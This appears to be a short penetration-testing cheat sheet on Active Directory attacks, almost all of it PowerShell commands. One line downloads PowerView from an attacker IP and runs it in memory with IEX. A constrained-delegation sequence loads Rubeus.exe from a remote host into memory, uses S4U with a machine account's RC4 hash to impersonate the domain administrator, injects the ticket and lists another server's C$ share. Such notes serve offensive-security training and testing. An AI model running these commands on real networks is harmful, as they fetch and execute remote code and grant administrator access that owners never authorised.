# Active Directory

## General

PowerView

{% code overflow="wrap" %}
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.119.120/powerview.ps1') | IEX
```
{% endcode %}

Constrained Delegation

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Enumerate using PowerView
</strong><strong>Get-DomainComputer -TrustedToAuth
</strong><strong># Download Rubeus into memory
</strong>$data = (New-Object System.Net.WebClient).DownloadData('http://$lhost/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
# Invoking the purge function from Rubeus in memory
[Rubeus.Program]::Main("purge".Split())
# Using the S4U protocol transitions to request a TGS
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
# Displaying the requested TGS
klist
# Test ticket is working
ls \\file01\c$
</code></pre>
